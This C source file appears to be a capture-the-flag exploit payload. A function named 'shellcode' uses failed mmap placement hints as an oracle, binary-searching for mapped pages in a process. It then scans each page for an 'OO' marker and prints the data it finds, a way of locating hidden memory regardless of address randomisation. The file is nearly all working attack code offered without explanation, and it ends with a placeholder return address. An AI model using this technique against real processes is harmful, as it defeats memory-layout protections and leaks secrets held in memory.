#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <asm/errno.h>

#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL


long total = 0;
void *search(void *ptr){
	int found = 0;
	int i = 0;
	void *oldptr = ptr;
	void *newptr = NULL;
	while(found==0){
		i++;
		found = 0;
		//-------------------------------------
		//binary search for an existing page, upper limit 4096*32 PAGE_SIZE
		//-------------------------------------
		unsigned long int right = 4096*32; //that's the max without failing mmap
		unsigned long int left = 0;
		while(left<right-1){
			unsigned long int mid = (right+left)/2;
			unsigned long int offset = mid*0x1000UL;
			void *r1 = mmap(ptr, offset, PROT_READ|PROT_WRITE, 
					MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
			if(r1==ptr){//allocate success, means no page there
				left = mid;
				munmap(ptr, offset);
			}else{//allocate failure, means there is some page
				right = mid;
				munmap(r1, offset);
			}
			if(left==right-1){
				newptr = ptr + left*0x1000UL; //that's the first addr causing trouble
				void *r2 = mmap(newptr, 4096, PROT_READ|PROT_WRITE, 
					MAP_ANONYMOUS|MAP_PRIVATE , -1, 0);
				if(r2==newptr){//NOT FOUND
					found = 0;
					munmap(newptr, 4096);
				}else{//found existing page
					found = 1;
					munmap(r2, 4096);
				}
				break;
			}
		}//end of while
		total += i;
		ptr = newptr;
	}//end of while found==0
	return ptr;
}

void *shellcode()
{
	printf("==========================\n");
	char *ptr = ADDR_MIN ;
	for(int i=0; i<100; i++){
		ptr = search(ptr);
		if(*ptr=='O' && *(ptr+1)=='O'){
			printf("%s\n", ptr);
			return ptr;
		}
		ptr += 0x1000UL;
	}
	printf("OH YEAH");
	return (void*) 0x123456; // For this simplified test it's also OK to return the address
}
